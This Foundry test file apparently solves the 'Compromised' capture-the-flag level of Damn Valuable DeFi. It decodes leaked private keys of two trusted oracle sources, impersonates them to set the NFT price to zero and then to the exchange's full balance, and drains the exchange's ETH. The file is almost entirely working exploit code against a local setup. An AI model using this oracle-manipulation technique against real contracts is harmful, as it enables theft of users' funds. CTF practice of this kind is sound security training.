// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";

import {Exchange} from "../../../src/Contracts/compromised/Exchange.sol";
import {TrustfulOracle} from "../../../src/Contracts/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../../src/Contracts/compromised/TrustfulOracleInitializer.sol";
import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";

contract Compromised is Test {
    uint256 internal constant EXCHANGE_INITIAL_ETH_BALANCE = 9990e18;
    uint256 internal constant INITIAL_NFT_PRICE = 999e18;

    Exchange internal exchange;
    TrustfulOracle internal trustfulOracle;
    TrustfulOracleInitializer internal trustfulOracleInitializer;
    DamnValuableNFT internal damnValuableNFT;
    address payable internal attacker;

    function setUp() public {
        address[] memory sources = new address[](3);

        sources[0] = 0xA73209FB1a42495120166736362A1DfA9F95A105;
        sources[1] = 0xe92401A4d3af5E446d93D11EEc806b1462b39D15;
        sources[2] = 0x81A5D6E50C214044bE44cA0CB057fe119097850c;

        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
        vm.deal(attacker, 0.1 ether);
        vm.label(attacker, "Attacker");
        assertEq(attacker.balance, 0.1 ether);

        // Initialize balance of the trusted source addresses
        uint256 arrLen = sources.length;
        for (uint8 i = 0; i < arrLen; ) {
            vm.deal(sources[i], 2 ether);
            assertEq(sources[i].balance, 2 ether);
            unchecked {
                ++i;
            }
        }

        string[] memory symbols = new string[](3);
        for (uint8 i = 0; i < arrLen; ) {
            symbols[i] = "DVNFT";
            unchecked {
                ++i;
            }
        }

        uint256[] memory initialPrices = new uint256[](3);
        for (uint8 i = 0; i < arrLen; ) {
            initialPrices[i] = INITIAL_NFT_PRICE;
            unchecked {
                ++i;
            }
        }

        // Deploy the oracle and setup the trusted sources with initial prices
        trustfulOracle = new TrustfulOracleInitializer(
            sources,
            symbols,
            initialPrices
        ).oracle();

        // Deploy the exchange and get the associated ERC721 token
        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(
            address(trustfulOracle)
        );
        damnValuableNFT = exchange.token();

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    // Fom:https://github.com/BlockChainCaffe/Base64.sol/blob/main/contracts/base64.sol
    bytes private constant base64urlchars =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_=";

    function decodeB64(string memory _str)
        internal
        pure
        returns (string memory)
    {
        require((bytes(_str).length % 4) == 0, "Length not multiple of 4");
        bytes memory _bs = bytes(_str);

        uint256 i = 0;
        uint256 j = 0;
        uint256 dec_length = (_bs.length / 4) * 3;
        bytes memory dec = new bytes(dec_length);

        for (; i < _bs.length; i += 4) {
            (dec[j], dec[j + 1], dec[j + 2]) = dencode4(
                bytes1(_bs[i]),
                bytes1(_bs[i + 1]),
                bytes1(_bs[i + 2]),
                bytes1(_bs[i + 3])
            );
            j += 3;
        }
        while (dec[--j] == 0) {}

        bytes memory res = new bytes(j + 1);
        for (i = 0; i <= j; i++) res[i] = dec[i];

        return string(res);
    }

    function dencode4(
        bytes1 b0,
        bytes1 b1,
        bytes1 b2,
        bytes1 b3
    )
        private
        pure
        returns (
            bytes1 a0,
            bytes1 a1,
            bytes1 a2
        )
    {
        uint256 pos0 = charpos(b0);
        uint256 pos1 = charpos(b1);
        uint256 pos2 = charpos(b2) % 64;
        uint256 pos3 = charpos(b3) % 64;

        a0 = bytes1(uint8(((pos0 << 2) | (pos1 >> 4))));
        a1 = bytes1(uint8((((pos1 & 15) << 4) | (pos2 >> 2))));
        a2 = bytes1(uint8((((pos2 & 3) << 6) | pos3)));
    }

    function charpos(bytes1 char) private pure returns (uint256 pos) {
        for (; base64urlchars[pos] != char; pos++) {} //for loop body is not necessary
        require(base64urlchars[pos] == char, "Illegal char in string");
        return pos;
    }

    // Fom:https://ethereum.stackexchange.com/questions/39989/solidity-convert-hex-string-to-bytes
    // Convert an hexadecimal character to their value
    function fromHexChar(uint8 c) public pure returns (uint8) {
        if (bytes1(c) >= bytes1("0") && bytes1(c) <= bytes1("9")) {
            return c - uint8(bytes1("0"));
        }
        if (bytes1(c) >= bytes1("a") && bytes1(c) <= bytes1("f")) {
            return 10 + c - uint8(bytes1("a"));
        }
        if (bytes1(c) >= bytes1("A") && bytes1(c) <= bytes1("F")) {
            return 10 + c - uint8(bytes1("A"));
        }
        revert("fail");
    }

    // Convert an hexadecimal string to raw bytes
    function fromHex(string memory s) public pure returns (bytes memory) {
        bytes memory ss = bytes(s);
        require(ss.length % 2 == 0); // length must be even
        bytes memory r = new bytes(ss.length / 2);
        for (uint256 i = 0; i < ss.length / 2; ++i) {
            r[i] = bytes1(
                fromHexChar(uint8(ss[2 * i])) *
                    16 +
                    fromHexChar(uint8(ss[2 * i + 1]))
            );
        }
        return r;
    }

    //From:https://ethereum.stackexchange.com/questions/31457/substring-in-solidity
    function substring(
        string memory str,
        uint256 startIndex,
        uint256 endIndex
    ) public pure returns (string memory) {
        bytes memory strBytes = bytes(str);
        bytes memory result = new bytes(endIndex - startIndex);
        for (uint256 i = startIndex; i < endIndex; i++) {
            result[i - startIndex] = strBytes[i];
        }
        return string(result);
    }

    function testExploit() public {
        /** EXPLOIT START **/
        //First we decode hex intercepted message to string
        string
            memory privateKey1 = hex"4d48686a4e6a63345a575978595745304e545a6b59545931597a5a6d597a55344e6a466b4e4451344f544a6a5a475a68597a426a4e6d4d34597a49314e6a42695a6a426a4f575a69593252685a544a6d4e44637a4e574535";
        string
            memory privateKey2 = hex"4d4867794d4467794e444a6a4e4442685932526d59546c6c5a4467344f5755324f44566a4d6a4d314e44646859324a6c5a446c695a575a6a4e6a417a4e7a466c4f5467334e575a69593251334d7a597a4e444269596a5134";

        //Then decode from base64
        string memory addr1 = decodeB64(privateKey1);
        string memory addr2 = decodeB64(privateKey2);

        //Convert address to uint256 (without first two bytes="0x")
        uint256 addr1Int = uint256(bytes32(fromHex(substring(addr1, 2, 66))));
        uint256 addr2Int = uint256(bytes32(fromHex(substring(addr2, 2, 66))));

        //Now get addresses
        address TRUSTED_SOURCE1 = vm.addr(addr1Int);
        address TRUSTED_SOURCE2 = vm.addr(addr2Int);

        //Set NFT price to 0
        vm.prank(TRUSTED_SOURCE1);
        trustfulOracle.postPrice("DVNFT", 0);

        vm.prank(TRUSTED_SOURCE2);
        trustfulOracle.postPrice("DVNFT", 0);

        //Buy an NFT
        vm.prank(attacker);
        address(exchange).call{value: 1}(abi.encodeWithSignature("buyOne()"));

        //Set NFT price to all exchange balance
        vm.prank(TRUSTED_SOURCE1);
        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);

        vm.prank(TRUSTED_SOURCE2);
        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);

        //Buy our NFT
        vm.startPrank(attacker);
        damnValuableNFT.approve(address(exchange), 0);
        exchange.sellOne(0);
        vm.stopPrank();

        //Set NFT price to initial price 999 ethers
        vm.prank(TRUSTED_SOURCE1);
        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);

        vm.prank(TRUSTED_SOURCE2);
        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);

        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        // Exchange must have lost all ETH
        assertEq(address(exchange).balance, 0);

        // Attacker's ETH balance must have significantly increased
        assertGt(attacker.balance, EXCHANGE_INITIAL_ETH_BALANCE);

        // Attacker must not own any NFT
        assertEq(damnValuableNFT.balanceOf(attacker), 0);

        // NFT price shouldn't have changed
        assertEq(trustfulOracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }
}
